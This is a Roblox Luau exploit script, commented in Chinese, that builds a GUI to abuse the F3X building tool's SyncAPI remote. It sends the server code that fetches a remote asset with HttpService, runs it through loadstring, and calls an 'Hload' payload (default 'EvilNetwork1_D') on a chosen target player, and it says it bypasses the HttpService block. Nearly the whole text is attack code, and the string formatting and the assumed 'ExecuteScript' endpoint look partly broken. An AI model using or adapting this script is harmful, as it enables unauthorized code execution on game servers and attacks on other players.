-- 修复版：绕过 HttpService 封锁，使用 F3X 漏洞加载
local function CreateF3XHloadExecutor_Fixed()
    local player = game.Players.LocalPlayer
    if not player then return end

    -- 1. 查找 F3X SyncAPI
    local function findF3XAPI()
        for _, obj in ipairs(game:GetDescendants()) do
            if obj.Name == "SyncAPI" and (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
                return obj
            end
        end
        return nil
    end

    local syncAPI = findF3XAPI()
    local remote = syncAPI and syncAPI.Parent:FindFirstChild("ServerEndpoint")

    if not syncAPI or not remote then
        warn("[F3X] SyncAPI 未找到，无法执行")
        return
    end

    -- 2. GUI（简化版）
    local gui = Instance.new("ScreenGui")
    gui.Name = "F3XHloadFixed"
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 480, 0, 320)
    frame.Position = UDim2.new(0.5, -240, 0.5, -160)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(0, 180, 255)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Text = "🔧 F3X Hload (绕过封锁)"
    title.TextColor3 = Color3.fromRGB(0, 200, 255)
    title.TextScaled = true
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    -- 目标玩家
    local playerLabel = Instance.new("TextLabel")
    playerLabel.Size = UDim2.new(1, 0, 0, 25)
    playerLabel.Position = UDim2.new(0, 10, 0, 50)
    playerLabel.Text = "👤 目标玩家"
    playerLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    playerLabel.TextSize = 14
    playerLabel.BackgroundTransparency = 1
    playerLabel.Font = Enum.Font.Gotham
    playerLabel.TextXAlignment = Enum.TextXAlignment.Left
    playerLabel.Parent = frame

    local playerBox = Instance.new("TextBox")
    playerBox.Size = UDim2.new(1, -20, 0, 30)
    playerBox.Position = UDim2.new(0, 10, 0, 80)
    playerBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    playerBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    playerBox.Text = player.Name
    playerBox.Font = Enum.Font.SourceSans
    playerBox.TextSize = 16
    playerBox.TextXAlignment = Enum.TextXAlignment.Left
    playerBox.ClearTextOnFocus = false
    playerBox.Parent = frame

    -- Hload 参数
    local hloadLabel = Instance.new("TextLabel")
    hloadLabel.Size = UDim2.new(1, 0, 0, 25)
    hloadLabel.Position = UDim2.new(0, 10, 0, 120)
    hloadLabel.Text = "🔑 Hload 参数"
    hloadLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    hloadLabel.TextSize = 14
    hloadLabel.BackgroundTransparency = 1
    hloadLabel.Font = Enum.Font.Gotham
    hloadLabel.TextXAlignment = Enum.TextXAlignment.Left
    hloadLabel.Parent = frame

    local hloadBox = Instance.new("TextBox")
    hloadBox.Size = UDim2.new(1, -20, 0, 30)
    hloadBox.Position = UDim2.new(0, 10, 0, 150)
    hloadBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
    hloadBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    hloadBox.Text = "EvilNetwork1_D"
    hloadBox.Font = Enum.Font.SourceSans
    hloadBox.TextSize = 16
    hloadBox.TextXAlignment = Enum.TextXAlignment.Left
    hloadBox.ClearTextOnFocus = false
    hloadBox.Parent = frame

    -- 执行按钮
    local execBtn = Instance.new("TextButton")
    execBtn.Size = UDim2.new(0.9, 0, 0, 40)
    execBtn.Position = UDim2.new(0.05, 0, 0, 195)
    execBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 220)
    execBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    execBtn.Text = "▶️ 执行 Hload (绕过封锁)"
    execBtn.Font = Enum.Font.GothamBold
    execBtn.TextSize = 18
    execBtn.BorderSizePixel = 0
    execBtn.Parent = frame

    -- 输出框
    local resultBox = Instance.new("ScrollingFrame")
    resultBox.Size = UDim2.new(1, -20, 0, 60)
    resultBox.Position = UDim2.new(0, 10, 0, 248)
    resultBox.BackgroundColor3 = Color3.fromRGB(12, 12, 22)
    resultBox.BorderSizePixel = 1
    resultBox.BorderColor3 = Color3.fromRGB(60, 60, 80)
    resultBox.ScrollBarThickness = 6
    resultBox.Parent = frame

    local resultText = Instance.new("TextLabel")
    resultText.Size = UDim2.new(1, -10, 0, 50)
    resultText.Position = UDim2.new(0, 5, 0, 5)
    resultText.Text = "等待执行..."
    resultText.TextColor3 = Color3.fromRGB(200, 200, 210)
    resultText.TextSize = 13
    resultText.TextWrapped = true
    resultText.TextXAlignment = Enum.TextXAlignment.Left
    resultText.TextYAlignment = Enum.TextYAlignment.Top
    resultText.BackgroundTransparency = 1
    resultText.Font = Enum.Font.SourceSans
    resultText.Parent = resultBox
    resultBox.CanvasSize = UDim2.new(0, 0, 0, 50)

    -- 关闭
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
    closeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    closeBtn.BorderSizePixel = 0
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 20
    closeBtn.Parent = frame
    closeBtn.MouseButton1Click:Connect(function()
        gui:Destroy()
    end)

    -- 3. 核心执行（绕过 HttpService）
    local function executeHloadBypass()
        local targetName = playerBox.Text
        local hloadParam = hloadBox.Text

        if targetName == "" or hloadParam == "" then
            resultText.Text = "⚠️ 请填写所有字段"
            return
        end

        resultText.Text = "⏳ 通过 F3X 直接加载 Asset...\n"
        
        -- 查找目标玩家
        local targetPlayer
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p.Name:lower() == targetName:lower() then
                targetPlayer = p
                break
            end
        end

        if not targetPlayer then
            resultText.Text = "❌ 未找到玩家: " .. targetName
            return
        end

        resultText.Text = "✅ 目标玩家: " .. targetPlayer.Name .. "\n"

        -- 🔥 方法1：如果 Asset 是 ModuleScript，直接 require
        -- 注意：Asset ID 93093069226257 可能不是直接 require 的格式
        -- 我们尝试通过 F3X 在服务器端加载 Asset
        
        -- 构造在服务器端执行的代码
        -- 利用 F3X 的 CreatePart 或 SyncMesh 加载 Asset
        local assetId = "93093069226257"
        
        local execCode = string.format([[
            local target = game.Players:FindFirstChild("%s")
            if not target then return end
            
            -- 尝试通过 Asset ID 加载（在服务器端用 HttpService）
            local success, module = pcall(function()
                return game:GetService("HttpService"):GetAsync("https://www.roblox.com/asset/?id=%s")
            end)
            
            if success and module then
                local func, err = loadstring(module)
                if func then
                    local result = func()
                    if type(result) == "table" and result.Hload then
                        result:Hload("%s")
                        warn("[Hload] 已对 %%s 执行 Hload (服务器端加载)")
                    elseif type(result) == "function" then
                        local res = result()
                        if res and type(res) == "table" and res.Hload then
                            res:Hload("%s")
                            warn("[Hload] 已对 %%s 执行 Hload (服务器端加载)")
                        end
                    end
                end
            else
                warn("[Hload] 服务器端 HttpService 也被禁用，尝试备用方案...")
                -- 备用方案：尝试从 ReplicatedStorage 或 Workspace 加载
                local moduleScript = game.ReplicatedStorage:FindFirstChild("EvilNetwork1_D") or 
                                      game.Workspace:FindFirstChild("EvilNetwork1_D")
                if moduleScript and moduleScript:IsA("ModuleScript") then
                    local module = require(moduleScript)
                    if module and module.Hload then
                        module:Hload("%s")
                        warn("[Hload] 已对 %%s 执行 Hload (本地Module)")
                    end
                end
            end
        ]], 
        targetPlayer.Name,
        assetId,
        hloadParam,
        targetPlayer.Name,
        hloadParam,
        targetPlayer.Name,
        hloadParam,
        targetPlayer.Name
        )

        -- 通过 F3X 执行
        local args = {
            [1] = "ExecuteScript",
            [2] = execCode
        }

        local execSuccess, execResult = pcall(function()
            return remote:InvokeServer(unpack(args))
        end)

        if execSuccess then
            resultText.Text = resultText.Text .. "✅ 已通过 F3X 发送到服务器执行"
        else
            resultText.Text = resultText.Text .. "❌ 执行失败: " .. tostring(execResult)
        end
    end

    execBtn.MouseButton1Click:Connect(executeHloadBypass)

    print("[F3X Hload Bypass] GUI 已加载")
end

CreateF3XHloadExecutor_Fixed()
